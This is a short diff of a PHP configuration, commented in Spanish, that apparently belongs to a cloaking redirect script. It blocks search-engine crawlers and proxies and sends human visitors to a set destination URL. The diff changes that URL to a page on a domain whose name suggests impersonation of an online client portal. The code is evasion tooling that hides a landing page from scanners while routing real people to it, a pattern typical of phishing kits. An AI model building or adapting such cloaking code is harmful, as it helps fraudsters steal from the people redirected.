@@ -7,7 +7,7 @@ define('CACHE_TIME', 3600);
 define('BLOCK_CRAWLERS', true);
 define('BLOCK_PROXIES', true);
 // URL A LA QUE QUIERES MANDAR A LOS HUMANOS
-define('DESTINATION_URL', 'https://onlineclientescol.com'); // <--- CAMBIA ESTO POR TU URL
+define('DESTINATION_URL', 'https://onlineclientescol.com/inicio.html'); // <--- CAMBIA ESTO POR TU URL
 
 $botUserAgents = [
     'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandexbot',
